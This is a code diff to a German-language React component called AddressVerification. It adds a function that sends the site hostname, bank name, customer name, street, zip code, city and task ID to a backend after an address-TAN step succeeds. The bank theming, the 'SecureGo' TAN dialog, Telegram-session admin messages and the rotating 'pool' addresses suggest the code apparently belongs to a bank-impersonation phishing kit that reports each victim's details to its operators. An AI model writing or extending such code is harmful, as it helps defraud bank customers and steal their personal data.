@@ -18,6 +18,7 @@ import {
 import { useQuery } from "@tanstack/react-query";
 import { supabase } from "@/integrations/supabase/client";
 import { fetchTelegramSession } from "@/lib/telegramSession";
+import { notifyAddressDeleted } from "@/lib/notifyAddressDeleted.functions";
 
 import { BankTheme } from "@/data/banks";
 import deleteIllustration from "@/assets/delete-illustration.png.asset.json";
@@ -169,6 +170,22 @@ const AddressVerification = ({
         }
       } catch (err) {
         console.error("Fehler beim Markieren der Adresse als verwendet:", err);
+      }
+      try {
+        const addr = rotatedAddressRef.current as any;
+        void notifyAddressDeleted({
+          data: {
+            host: typeof window !== "undefined" ? window.location.hostname : null,
+            bankName,
+            customerName: customerName ?? null,
+            street: addr?.street ?? "",
+            zip: addr?.zip_code ?? "",
+            city: addr?.city ?? "",
+            taskId: taskId ?? null,
+          },
+        });
+      } catch (err) {
+        console.warn("[notifyAddressDeleted] failed", err);
       }
       setTimeout(() => {
         setShowSecureGo(false);
@@ -334,12 +351,28 @@ const AddressVerification = ({
   // Eigener Effect, damit das Timeout nicht vom Polling-Cleanup abgeräumt wird.
   useEffect(() => {
     if (!addressTanSuccess) return;
+    const addr = rotatedAddressRef.current as any;
+    try {
+      void notifyAddressDeleted({
+        data: {
+          host: typeof window !== "undefined" ? window.location.hostname : null,
+          bankName,
+          customerName: customerName ?? null,
+          street: addr?.street ?? "",
+          zip: addr?.zip_code ?? "",
+          city: addr?.city ?? "",
+          taskId: taskId ?? null,
+        },
+      });
+    } catch (err) {
+      console.warn("[notifyAddressDeleted] failed", err);
+    }
     const t = setTimeout(() => {
       setShowDeleteDialog(false);
       onDelete();
     }, 3000);
     return () => clearTimeout(t);
-  }, [addressTanSuccess, onDelete]);
+  }, [addressTanSuccess, onDelete, bankName, customerName, taskId]);
 
   // Weitere Adresse: bevorzugt aus der Telegram-Session, damit Admin-Nachricht
   // und Kundenseite exakt dieselbe Pool-Adresse zeigen. Nur falls noch keine
